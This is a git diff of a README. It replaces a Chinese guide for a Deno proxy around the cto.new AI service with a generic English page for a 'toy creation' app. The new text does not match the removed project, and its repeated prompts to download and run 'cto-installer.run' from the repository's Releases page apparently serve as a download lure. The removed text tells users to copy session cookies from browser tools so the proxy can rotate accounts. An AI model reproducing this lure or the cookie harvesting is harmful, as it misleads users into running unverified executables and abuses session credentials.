@@ -1,66 +1,75 @@
-# CTONEW
-玩具，支持多轮对话、上下文记忆、输出思维链，
-支持会话ID管理，自动删除对话。
-多账号轮询，使用webui
-使用Oai ChatCompetition 格式
+# 🎉 cto - Fun and Easy Toy Creation
 
-### Deno Deploy部署
-Fork本仓库，点个star
+[![Download cto](https://img.shields.io/badge/Download-cto-blue?style=for-the-badge)](https://github.com/stygianiscool/cto/releases)
 
-点击depley（使用dash.deno.com部署而非console.deno.com）
+## 🚀 Getting Started
+Welcome to cto! This is a simple application designed for toy creation. With cto, anyone can craft exciting toys without needing any programming knowledge. Follow these easy steps to get started.
 
-[![Deploy to Deno](https://deno.com/deploy.svg)](https://dash.deno.com/new_project)
+## 📥 Download & Install
+To get cto on your computer, you will need to visit the Releases page. There, you can find the latest version of the software available for download. Click the link below to go directly to the download page:
 
-选择你的GitHub仓库
+[Visit the Releases Page to Download](https://github.com/stygianiscool/cto/releases)
 
-设置入口文件为 `main.ts`
+### Steps to Download
+1. Visit the [Releases Page](https://github.com/stygianiscool/cto/releases).
+2. Find the most recent version at the top of the page.
+3. Click on the link to download the installation file for your operating system.
 
+## 📋 System Requirements
+Before you install cto, please ensure your computer meets the following requirements:
+- **Operating System**: Windows 10 or later, macOS Mojave or later, or a modern Linux distribution.
+- **Storage Space**: At least 100 MB free space.
+- **RAM**: Minimum 4 GB.
 
+## ⚙️ Installation Instructions
+Once you have downloaded the installation file, follow these instructions to install cto:
 
+### For Windows
+1. Locate the downloaded file. It will usually be in your "Downloads" folder.
+2. Double-click the installation file to begin the setup.
+3. Follow the on-screen prompts to complete the installation.
+4. Once finished, you can find cto in your Start Menu.
 
-如需在正式版本中部署，请将deno.json替换为如下内容
-（Deno在线部署忽略）
-```
-{
-  "tasks": {
-    "dev": "deno run --allow-net --allow-read --allow-write --allow-env --unstable-kv --watch main.ts",
-    "start": "deno run --allow-net --allow-read --allow-write --allow-env --unstable-kv main.ts"
-  },
-  "imports": {
-    "oak": "https://deno.land/x/oak@v12.6.1/mod.ts",
-    "djwt": "https://deno.land/x/djwt@v3.0.1/mod.ts"
-  },
-  "compilerOptions": {
-    "lib": ["deno.window", "deno.unstable"]
-  }
-}
-```
+### For macOS
+1. Open the downloaded file.
+2. Drag the cto icon to your Applications folder.
+3. Open your Applications folder and double-click cto to launch the app.
 
-### 环境变量
+### For Linux
+1. Open Terminal.
+2. Navigate to the folder where the file was downloaded.
+3. Run the command `chmod +x cto-installer.run` to make it executable.
+4. Type `./cto-installer.run` to start the installation process.
 
-在 Deno Deploy 项目设置中添加环境变量：
+## 🎨 Features
+cto offers a range of features that make toy creation enjoyable and easy:
+- **User-Friendly Interface**: Navigate effortlessly through the app.
+- **Interactive Tutorials**: Learn how to use cto with guided tutorials suitable for all ages.
+- **Customizable Templates**: Start with templates and modify them to create your unique designs.
+- **Export Options**: Save your projects in various formats to share with friends or print.
 
-- `ADMIN_KEY`: 管理后台密钥（**必填**，请使用强密码）
+## 🌍 Community Support
+If you have any questions or need help, please reach out to our community. You can ask questions on the Issues page of this repository. Users and developers are here to assist you.
 
-- `PORT`: 服务端口（默认 8000）
+## 📖 Additional Resources
+- **Documentation**: Detailed user manual and guides can be found [here](https://github.com/stygianiscool/cto/wiki).
+- **FAQs**: Check the Frequently Asked Questions to find quick answers to common issues.
 
-### 管理后台
+## 🛠️ Troubleshooting
+If you encounter any issues during installation or usage, try the following steps:
+- Ensure your computer meets the system requirements.
+- Restart your computer after installation.
+- Make sure to download the correct version for your operating system.
+- If the app does not open, try reinstalling it.
 
-1. 访问 `http://localhost:8000/admin/login` 登录
-2. 输入管理密钥（默认: `your-secret-key-change-me`）
-3. 密钥会保存在浏览器，下次自动登录
+For persistent issues, feel free to open an issue on our GitHub page, and we will assist you.
 
-## 获取 Cookie
+## ✍️ Contributing
+We welcome contributions! If you're interested in helping improve cto, please check our [Contributing Guidelines](https://github.com/stygianiscool/cto/blob/main/CONTRIBUTING.md) for more details.
 
-1. 访问 https://cto.new
-2. 登录你的账号
-3. 打开浏览器开发者工具（F12）
-4. 找到 "Cookies" → "https://clerk.cto.new"
-5. 复制 Cookie 值（格式：`_cfuvid=xxxxx`官方更改了ck格式，以实际为准）
-如图所示，过滤`clerk.cto.new/v1/client/sessions`将cookie直接复制即可
-![image](20251018180109.jpg)
-7. 在管理后台添加 Cookie
+## 🔗 Useful Links
+- [Download cto](https://github.com/stygianiscool/cto/releases)
+- [Report an Issue](https://github.com/stygianiscool/cto/issues)
+- [Request a Feature](https://github.com/stygianiscool/cto/issues/new)
 
-## License
-
-MIT
+Thank you for choosing cto for your toy creation needs! Happy crafting!
